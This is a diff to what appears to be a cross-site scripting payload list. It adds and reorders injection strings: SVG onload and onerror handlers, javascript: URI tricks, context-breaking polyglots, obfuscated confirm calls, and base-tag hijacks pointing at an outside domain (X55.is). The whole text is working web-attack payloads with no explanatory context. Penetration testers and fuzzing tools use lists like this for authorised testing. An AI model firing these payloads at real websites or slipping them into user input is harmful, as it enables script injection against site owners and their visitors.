@@ -1,10 +1,15 @@
 <svg><use><set attributeName="href" to="data:image/svg+xml,&lt;svg id='x' xmlns="http://www.w3.org/2000/svg"&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
 <Base Href=//X55.is>
+"<!--><Svg OnLoad=(confirm)(1)<!--
+JavaScript://%250Dtop.confirm?.(1)//
+1'"><!--><Base Href=//X55.is?
+1'-top['con\146irm'](1)-'
+/confirm(1)?.(1)//\
+["');alert('XSS');//"]@xyz.xxx
+'"><Svg OnLoad=alert(1)> '"1='
 <a/href="/alert(1)/">
 <a/href="/prompt(1)/"<
 <img/src="/prompt(1)/"<
-["');alert('XSS');//"]@xyz.xxx
-'"><Svg OnLoad=alert(1)> '"1='
 <xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76--> 
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
